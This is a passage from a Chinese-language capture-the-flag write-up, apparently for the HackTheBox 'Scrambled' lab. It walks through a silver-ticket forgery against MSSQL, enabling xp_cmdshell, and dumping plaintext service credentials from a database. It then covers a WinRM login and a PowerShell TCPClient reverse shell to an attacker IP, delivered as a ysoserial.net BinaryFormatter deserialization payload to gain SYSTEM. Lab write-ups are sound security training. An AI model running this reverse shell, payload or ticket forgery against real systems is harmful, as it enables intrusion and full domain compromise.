开始伪造。银票的特点是**全程不经过 KDC**：加密密钥就是服务账号自己的 NTLM hash，MSSQL 收到票后用自己的 hash 解密即认为合法。这里拿 sqlsvc 的 hash 给 `MSSQLSvc/DC1.scrm.local:1433` 签一张 administrator（RID 500 + 五个组）的票。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn "MSSQLSvc/DC1.scrm.local:1433" -user-id 500 -groups 512,513,518,519,520 administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ export KRB5CCNAME=$(pwd)/administrator.ccache
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ klist
Ticket cache: FILE:/home/kali/Work/Kali/Scrambled/administrator.ccache
Default principal: administrator@SCRM.LOCAL

Valid starting       Expires              Service principal
09/01/2026 01:40:48  08/29/2036 01:40:48  MSSQLSvc/DC1.scrm.local:1433@SCRM.LOCAL
	renew until 08/29/2036 01:40:48
```

带着银票以 `SCRM\administrator` 连上 MSSQL：`SYSTEM_USER` 显示 SCRM\administrator，sysadmin 成员返回 1。开 `xp_cmdshell` 拿到命令执行，但 `whoami` 显示的是 **scrm\sqlsvc** —— 银票伪造的是"登录身份"，作业还是以服务的真实运行账号跑的。不过没关系，sysadmin 权限已经足够翻库了。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ impacket-mssqlclient -k -no-pass SCRM.LOCAL/administrator@DC1.scrm.local -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> SELECT SYSTEM_USER;
                     
------------------   
SCRM\administrator   
SQL (SCRM\administrator  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1
SQL (SCRM\administrator  dbo@master)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> EXEC xp_cmdshell 'whoami';
output        
-----------   
scrm\sqlsvc   
NULL

```

库列表里果然有 `ScrambleHR` —— 正是公告里提到存过凭据的那套 HR 系统。`UserImport` 表是 LDAP 同步任务的配置表，里面明晃晃躺着一条：**MiscSvc / ScrambledEggs9900**，域内同步账号的凭据直接到手。

```bash
SQL (SCRM\administrator  dbo@master)> SELECT name FROM sys.databases;
name         
----------   
master       
tempdb       
model        
msdb         
ScrambleHR
SQL (SCRM\administrator  dbo@ScrambleHR)> SELECT table_name FROM information_schema.tables;
table_name   
----------   
Employees    
UserImport   
Timesheets   
SQL (SCRM\administrator  dbo@ScrambleHR)> SELECT * FROM UserImport
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0 
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ cat Users/MiscSvc
Miscsvc:ScrambledEggs9900
```

给 MiscSvc 申请 TGT，并在本机 `krb5.conf` 里补上 `SCRM.LOCAL` 的 realm / KDC 配置，`-r` 参数才能正确解析。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ impacket-getTGT scrm.local/Miscsvc:ScrambledEggs9900 -dc-ip 10.129.33.76
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Miscsvc.ccache
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ export KRB5CCNAME=$(pwd)/Miscsvc.ccache
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ klist
Ticket cache: FILE:/home/kali/Work/Kali/Scrambled/Miscsvc.ccache
Default principal: Miscsvc@SCRM.LOCAL

Valid starting       Expires              Service principal
09/01/2026 01:56:56  09/01/2026 11:56:56  krbtgt/SCRM.LOCAL@SCRM.LOCAL
	renew until 09/02/2026 01:57:37
```

修改 krb5.conf。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ cat /etc/krb5.conf
[libdefaults]
	default_realm = SCRM.LOCAL
	dns_lookup_realm = false
	dns_lookup_kdc = false
	rdns = false

# The following krb5.conf variables are only for MIT Kerberos.
	kdc_timesync = 1
	ccache_type = 4
	forwardable = true
	proxiable = true
        rdns = false


# The following libdefaults parameters are only for Heimdal Kerberos.
	fcc-mit-ticketflags = true

[realms]
	ATHENA.MIT.EDU = {
		kdc = kerberos.mit.edu
		kdc = kerberos-1.mit.edu
		kdc = kerberos-2.mit.edu:88
		admin_server = kerberos.mit.edu
		default_domain = mit.edu
	}
	ZONE.MIT.EDU = {
		kdc = casio.mit.edu
		kdc = seiko.mit.edu
		admin_server = casio.mit.edu
	}
	CSAIL.MIT.EDU = {
		admin_server = kerberos.csail.mit.edu
		default_domain = csail.mit.edu
	}
	IHTFP.ORG = {
		kdc = kerberos.ihtfp.org
		admin_server = kerberos.ihtfp.org
	}
	1TS.ORG = {
		kdc = kerberos.1ts.org
		admin_server = kerberos.1ts.org
	}
	ANDREW.CMU.EDU = {
		admin_server = kerberos.andrew.cmu.edu
		default_domain = andrew.cmu.edu
	}
        CS.CMU.EDU = {
                kdc = kerberos-1.srv.cs.cmu.edu
                kdc = kerberos-2.srv.cs.cmu.edu
                kdc = kerberos-3.srv.cs.cmu.edu
                admin_server = kerberos.cs.cmu.edu
        }
	DEMENTIA.ORG = {
		kdc = kerberos.dementix.org
		kdc = kerberos2.dementix.org
		admin_server = kerberos.dementix.org
	}
	stanford.edu = {
		kdc = krb5auth1.stanford.edu
		kdc = krb5auth2.stanford.edu
		kdc = krb5auth3.stanford.edu
		master_kdc = krb5auth1.stanford.edu
		admin_server = krb5-admin.stanford.edu
		default_domain = stanford.edu
	}
        UTORONTO.CA = {
                kdc = kerberos1.utoronto.ca
                kdc = kerberos2.utoronto.ca
                kdc = kerberos3.utoronto.ca
                admin_server = kerberos1.utoronto.ca
                default_domain = utoronto.ca
	}
     	 SCRM.LOCAL = {
       		kdc = DC1.scrm.local
	        admin_server = DC1.scrm.local
    	}

[domain_realm]
	.mit.edu = ATHENA.MIT.EDU
	mit.edu = ATHENA.MIT.EDU
	.media.mit.edu = MEDIA-LAB.MIT.EDU
	media.mit.edu = MEDIA-LAB.MIT.EDU
	.csail.mit.edu = CSAIL.MIT.EDU
	csail.mit.edu = CSAIL.MIT.EDU
	.whoi.edu = ATHENA.MIT.EDU
	whoi.edu = ATHENA.MIT.EDU
	.stanford.edu = stanford.edu
	.slac.stanford.edu = SLAC.STANFORD.EDU
        .toronto.edu = UTORONTO.CA
        .utoronto.ca = UTORONTO.CA
	.scrm.local = SCRM.LOCAL
     	scrm.local = SCRM.LOCAL
```

登录 Miscsvc 拿到 user.txt。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Scrambled]
└─$ evil-winrm -i DC1.scrm.local -r scrm.local -u Miscsvc -p 'ScrambledEggs9900'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Warning: Password is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\miscsvc\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\miscsvc\Desktop> type user.txt
5bc7567aa31b244d213e4106dace79a4
```

## Windows 提权

Shell 里翻到了之前 SMB 上进不去的 IT 共享对应的本地目录 `C:\Shares\IT\Apps`，`Sales Order Client` 客户端和它的库 `ScrambleLib.dll` 在里面 —— 正好对上 4411 端口那个自定义协议。把两个文件拖回本地做逆向。

```bash
*Evil-WinRM* PS C:\Shares\IT\Apps> cd 'Sales Order Client'
*Evil-WinRM* PS C:\Shares\IT\Apps\Sales Order Client> dir


    Directory: C:\Shares\IT\Apps\Sales Order Client


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/5/2021   8:52 PM          86528 ScrambleClient.exe
-a----        11/5/2021   8:52 PM          19456 ScrambleLib.dll

```

下载到 kali。

```bash
*Evil-WinRM* PS C:\Shares\IT\Apps\Sales Order Client> dir


    Directory: C:\Shares\IT\Apps\Sales Order Client


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/5/2021   8:52 PM          86528 ScrambleClient.exe
-a----        11/5/2021   8:52 PM          19456 ScrambleLib.dll
*Evil-WinRM* PS C:\Shares\IT\Apps\Sales Order Client> download ScrambleClient.exe
                                        
Info: Downloading C:\Shares\IT\Apps\Sales Order Client\ScrambleClient.exe to ScrambleClient.exe
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Shares\IT\Apps\Sales Order Client> download ScrambleLib.dll
                                        
Info: Downloading C:\Shares\IT\Apps\Sales Order Client\ScrambleLib.dll to ScrambleLib.dll
                                        
Info: Download successful!

```

将两个文件拿到 Windows 环境，用 dnspy 逆向。

`Logon()` 里藏着个明显的后门：用户名忽略大小写等于 `scrmdev` 时直接放行，连密码都不校验（日志都会记一句 `Developer logon bypass used`）。其余用户则把 `Username|Password` 拼起来发给 4411 服务端做认证 —— 也就是说客户端和服务端之间传的是序列化对象。

```bash
		public bool Logon(string Username, string Password)
		{
			bool flag;
			try
			{
				if (string.Compare(Username, "scrmdev", true) == 0)
				{
					Log.Write("Developer logon bypass used");
					flag = true;
				}
				else
				{
					HashAlgorithm hashAlgorithm = MD5.Create();
					byte[] bytes = Encoding.ASCII.GetBytes(Password);
					Convert.ToBase64String(hashAlgorithm.ComputeHash(bytes, 0, bytes.Length));
					ScrambleNetResponse scrambleNetResponse = this.SendRequestAndGetResponse(new ScrambleNetRequest(ScrambleNetRequest.RequestType.AuthenticationRequest, Username + "|" + Password));
					ScrambleNetResponse.ResponseType type = scrambleNetResponse.Type;
					if (type != ScrambleNetResponse.ResponseType.Success)
					{
						if (type != ScrambleNetResponse.ResponseType.InvalidCredentials)
						{
							throw new ApplicationException(scrambleNetResponse.GetErrorDescription());
						}
						Log.Write("Logon failed due to invalid credentials");
						flag = false;
					}
					else
					{
						Log.Write("Logon successful");
						flag = true;
					}
				}
			}
			catch (Exception ex)
			{
				Log.Write("Error: " + ex.Message);
				throw ex;
			}
			return flag;
		}
```

打开 ScrambleClient.exe，按之前发现的配置进行配置。

![](Pasted%20image%2020260907171126.png)

Windows 添加靶机进 hosts 文件，连接成功。

```bash
PS C:\Windows\system32 > Set-ItemProperty C:\Windows\System32\drivers\etc\hosts -Name IsReadOnly -Value $false
Commando VM 09/09/2026 14:03:44
PS C:\Windows\system32 > Add-Content C:\Windows\System32\drivers\etc\hosts -Value "10.129.36.208 dc1.scrm.local"
Commando VM 09/09/2026 14:04:23
PS C:\Windows\system32 > Ping dc1.scrm.local

正在 Ping dc1.scrm.local [10.129.36.208] 具有 32 字节的数据:
来自 10.129.36.208 的回复: 字节=32 时间=106ms TTL=127
来自 10.129.36.208 的回复: 字节=32 时间=106ms TTL=127
来自 10.129.36.208 的回复: 字节=32 时间=105ms TTL=127
来自 10.129.36.208 的回复: 字节=32 时间=105ms TTL=127

10.129.36.208 的 Ping 统计信息:
    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，
往返行程的估计时间(以毫秒为单位):
    最短 = 105ms，最长 = 106ms，平均 = 105ms
```

登录 scrmdev。

![](Pasted%20image%2020260909140538.png)

![](Pasted%20image%2020260909140555.png)

准备 payload：`$one` 是一个 TCPClient 反弹 shell，回连 `10.10.16.151:9999`；转 UTF-16LE 再 base64，作为 `powershell -enc` 的参数。然后用 ysoserial.net 生成 **BinaryFormatter** 反序列化 payload，gadget 选 `WindowsIdentity`，输出 base64 —— 服务端拿到客户端传来的对象直接 `BinaryFormatter.Deserialize()`，反序列化瞬间就会执行我们塞进去的命令。

```bash
PS C:\Users\Chenling\Desktop\Tools\ysoserial.net\Release > $one = '$c=New-Object System.Net.Sockets.TCPClient("10.10.16.151",9999);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String)+"PS> ";$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
Commando VM 09/09/2026 15:25:02
PS C:\Users\Chenling\Desktop\Tools\Networking > $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($one))
Commando VM 09/09/2026 15:23:43
```

```bash
PS C:\Users\Chenling\Desktop\Tools\ysoserial.net\Release > .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "powershell -nop -w hidden -enc $enc"
AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA/BJBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBdmd3OFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUhCdmQyVnljMmhsYkd3Z0xXNXZjQ0F0ZHlCb2FXUmtaVzRnTFdWdVl5QktRVUpxUVVRd1FWUm5RbXhCU0dOQlRGRkNVRUZIU1VGaFowSnNRVWROUVdSQlFXZEJSazFCWlZGQ2VrRklVVUZhVVVKMFFVTTBRVlJuUW14QlNGRkJUR2RDVkVGSE9FRlpkMEp5UVVkVlFXUkJRbnBCUXpSQlZrRkNSRUZHUVVGUmQwSnpRVWRyUVZwUlFuVkJTRkZCUzBGQmFVRkVSVUZOUVVGMVFVUkZRVTFCUVhWQlJFVkJUbWRCZFVGRVJVRk9VVUY0UVVOSlFVeEJRVFZCUkd0QlQxRkJOVUZEYTBGUGQwRnJRVWhOUVZCUlFXdEJSMDFCVEdkQ1NFRkhWVUZrUVVKVVFVaFJRV05uUW14QlIwVkJZbEZCYjBGRGEwRlBkMEppUVVkSlFXVlJRakJCUjFWQlYzZENaRUZHTUVGS1FVSnBRVVF3UVUxQlFYVkJRelJCVG1kQk1VRkVWVUZOZDBFeFFVaDNRVXBSUWpkQlJFRkJabEZCTjBGSVkwRmhRVUp3UVVkM1FWcFJRVzlCUTJkQlNrRkNjRUZFTUVGS1FVSjZRVU0wUVZWblFteEJSMFZCV2tGQmIwRkRVVUZaWjBGelFVUkJRVXhCUVd0QlIwbEJUR2RDVFVGSFZVRmlaMEp1UVVoUlFXRkJRWEJCUTJ0QlNVRkJkRUZITkVGYVVVRm5RVVJCUVV0UlFqZEJRMUZCV2tGQk9VRkRaMEZVWjBKc1FVaGpRVXhSUWxCQlIwbEJZV2RDYkVGSFRVRmtRVUZuUVVaUlFWcFJRalJCU0ZGQlRHZENRa0ZHVFVGUmQwSktRVVZyUVZKUlFuVkJSMDFCWW5kQ2EwRkhhMEZpWjBKdVFVTnJRVXhuUWtoQlIxVkJaRUZDVkVGSVVVRmpaMEp3UVVjMFFWcDNRVzlCUTFGQldXZEJjMEZFUVVGTVFVRnJRVWRyUVV0UlFUZEJRMUZCWTJkQk9VRkRaMEZoVVVKc1FVaG5RVWxCUVd0QlIxRkJTVUZCZVVGRU5FRktaMEY0UVVoM1FWUjNRakZCU0ZGQlRGRkNWRUZJVVVGalowSndRVWMwUVZwM1FYQkJRM05CU1dkQ1VVRkdUVUZRWjBGblFVTkpRVTkzUVd0QlNFMUJXV2RCT1VGRFowRlhkMEpWUVVkVlFXVkJRakJCUXpSQlVsRkNkVUZIVFVGaWQwSnJRVWRyUVdKblFtNUJSakJCVDJkQk5rRkZSVUZWZDBKRVFVVnJRVk5SUVhCQlF6UkJVbmRDYkVGSVVVRlJaMEkxUVVoUlFWcFJRbnBCUTJkQlNrRkNlVUZEYTBGUGQwRnJRVWhOUVV4blFsaEJTRWxCWVZGQ01FRkhWVUZMUVVGclFVaE5RVmxuUVhOQlJFRkJURUZCYTBGSVRVRlpaMEYxUVVWM1FWcFJRblZCUjJOQlpFRkNiMEZEYTBGUGQwRnJRVWhOUVV4blFrZEJSM2RCWkZGQ2VrRkhaMEZMUVVGd1FVZ3dRVTkzUVd0QlIwMUJUR2RDUkVGSGQwRmlkMEo2UVVkVlFVdEJRWEJCUVQwOUlpQlRkR0Z1WkdGeVpFVnljbTl5Ulc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVGRHRnVaR0Z5WkU5MWRIQjFkRVZ1WTI5a2FXNW5QU0o3ZURwT2RXeHNmU0lnVlhObGNrNWhiV1U5SWlJZ1VHRnpjM2R2Y21ROUludDRPazUxYkd4OUlpQkViMjFoYVc0OUlpSWdURzloWkZWelpYSlFjbTltYVd4bFBTSkdZV3h6WlNJZ1JtbHNaVTVoYldVOUltTnRaQ0lnTHo0TkNpQWdJQ0FnSUR3dmMyUTZVSEp2WTJWemN5NVRkR0Z5ZEVsdVptOCtEUW9nSUNBZ1BDOXpaRHBRY205alpYTnpQZzBLSUNBOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpNVBZbXBsWTNSSmJuTjBZVzVqWlQ0TkNqd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlQZ3M9Cw==
Commando VM 09/10/2026 10:36:52
```

```bash
PS C:\Users\Chenling\Desktop\Tools\Networking > .\nc64.exe dc1.scrm.local 4411
SCRAMBLECORP_ORDERS_V1.0.3;
UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA/BJBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBdmd3OFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0TVRZaVB6NE5DanhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWElnVFdWMGFHOWtUbUZ0WlQwaVUzUmhjblFpSUVselNXNXBkR2xoYkV4dllXUkZibUZpYkdWa1BTSkdZV3h6WlNJZ2VHMXNibk05SW1oMGRIQTZMeTl6WTJobGJXRnpMbTFwWTNKdmMyOW1kQzVqYjIwdmQybHVabmd2TWpBd05pOTRZVzFzTDNCeVpYTmxiblJoZEdsdmJpSWdlRzFzYm5NNmMyUTlJbU5zY2kxdVlXMWxjM0JoWTJVNlUzbHpkR1Z0TGtScFlXZHViM04wYVdOek8yRnpjMlZ0WW14NVBWTjVjM1JsYlNJZ2VHMXNibk02ZUQwaWFIUjBjRG92TDNOamFHVnRZWE11YldsamNtOXpiMlowTG1OdmJTOTNhVzVtZUM4eU1EQTJMM2hoYld3aVBnMEtJQ0E4VDJKcVpXTjBSR0YwWVZCeWIzWnBaR1Z5TGs5aWFtVmpkRWx1YzNSaGJtTmxQZzBLSUNBZ0lEeHpaRHBRY205alpYTnpQZzBLSUNBZ0lDQWdQSE5rT2xCeWIyTmxjM011VTNSaGNuUkpibVp2UGcwS0lDQWdJQ0FnSUNBOGMyUTZVSEp2WTJWemMxTjBZWEowU1c1bWJ5QkJjbWQxYldWdWRITTlJaTlqSUhCdmQyVnljMmhsYkd3Z0xXNXZjQ0F0ZHlCb2FXUmtaVzRnTFdWdVl5QktRVUpxUVVRd1FWUm5RbXhCU0dOQlRGRkNVRUZIU1VGaFowSnNRVWROUVdSQlFXZEJSazFCWlZGQ2VrRklVVUZhVVVKMFFVTTBRVlJuUW14QlNGRkJUR2RDVkVGSE9FRlpkMEp5UVVkVlFXUkJRbnBCUXpSQlZrRkNSRUZHUVVGUmQwSnpRVWRyUVZwUlFuVkJTRkZCUzBGQmFVRkVSVUZOUVVGMVFVUkZRVTFCUVhWQlJFVkJUbWRCZFVGRVJVRk9VVUY0UVVOSlFVeEJRVFZCUkd0QlQxRkJOVUZEYTBGUGQwRnJRVWhOUVZCUlFXdEJSMDFCVEdkQ1NFRkhWVUZrUVVKVVFVaFJRV05uUW14QlIwVkJZbEZCYjBGRGEwRlBkMEppUVVkSlFXVlJRakJCUjFWQlYzZENaRUZHTUVGS1FVSnBRVVF3UVUxQlFYVkJRelJCVG1kQk1VRkVWVUZOZDBFeFFVaDNRVXBSUWpkQlJFRkJabEZCTjBGSVkwRmhRVUp3UVVkM1FWcFJRVzlCUTJkQlNrRkNjRUZFTUVGS1FVSjZRVU0wUVZWblFteEJSMFZCV2tGQmIwRkRVVUZaWjBGelFVUkJRVXhCUVd0QlIwbEJUR2RDVFVGSFZVRmlaMEp1UVVoUlFXRkJRWEJCUTJ0QlNVRkJkRUZITkVGYVVVRm5RVVJCUVV0UlFqZEJRMUZCV2tGQk9VRkRaMEZVWjBKc1FVaGpRVXhSUWxCQlIwbEJZV2RDYkVGSFRVRmtRVUZuUVVaUlFWcFJRalJCU0ZGQlRHZENRa0ZHVFVGUmQwSktRVVZyUVZKUlFuVkJSMDFCWW5kQ2EwRkhhMEZpWjBKdVFVTnJRVXhuUWtoQlIxVkJaRUZDVkVGSVVVRmpaMEp3UVVjMFFWcDNRVzlCUTFGQldXZEJjMEZFUVVGTVFVRnJRVWRyUVV0UlFUZEJRMUZCWTJkQk9VRkRaMEZoVVVKc1FVaG5RVWxCUVd0QlIxRkJTVUZCZVVGRU5FRktaMEY0UVVoM1FWUjNRakZCU0ZGQlRGRkNWRUZJVVVGalowSndRVWMwUVZwM1FYQkJRM05CU1dkQ1VVRkdUVUZRWjBGblFVTkpRVTkzUVd0QlNFMUJXV2RCT1VGRFowRlhkMEpWUVVkVlFXVkJRakJCUXpSQlVsRkNkVUZIVFVGaWQwSnJRVWRyUVdKblFtNUJSakJCVDJkQk5rRkZSVUZWZDBKRVFVVnJRVk5SUVhCQlF6UkJVbmRDYkVGSVVVRlJaMEkxUVVoUlFWcFJRbnBCUTJkQlNrRkNlVUZEYTBGUGQwRnJRVWhOUVV4blFsaEJTRWxCWVZGQ01FRkhWVUZMUVVGclFVaE5RVmxuUVhOQlJFRkJURUZCYTBGSVRVRlpaMEYxUVVWM1FWcFJRblZCUjJOQlpFRkNiMEZEYTBGUGQwRnJRVWhOUVV4blFrZEJSM2RCWkZGQ2VrRkhaMEZMUVVGd1FVZ3dRVTkzUVd0QlIwMUJUR2RDUkVGSGQwRmlkMEo2UVVkVlFVdEJRWEJCUVQwOUlpQlRkR0Z1WkdGeVpFVnljbTl5Ulc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVGRHRnVaR0Z5WkU5MWRIQjFkRVZ1WTI5a2FXNW5QU0o3ZURwT2RXeHNmU0lnVlhObGNrNWhiV1U5SWlJZ1VHRnpjM2R2Y21ROUludDRPazUxYkd4OUlpQkViMjFoYVc0OUlpSWdURzloWkZWelpYSlFjbTltYVd4bFBTSkdZV3h6WlNJZ1JtbHNaVTVoYldVOUltTnRaQ0lnTHo0TkNpQWdJQ0FnSUR3dmMyUTZVSEp2WTJWemN5NVRkR0Z5ZEVsdVptOCtEUW9nSUNBZ1BDOXpaRHBRY205alpYTnpQZzBLSUNBOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpNVBZbXBsWTNSSmJuTjBZVzVqWlQ0TkNqd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlQZ3M9Cw==
```

拿到 root.txt

```bash
PS> whoami
nt authority\system
PS> pwd

Path
----
C:\Windows\system32
PS> dir


    Directory: C:\Users\administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/09/2026     02:53             34 root.txt


PS> type root.txt
ca6612a2cb0898044911b415ee40c381
```
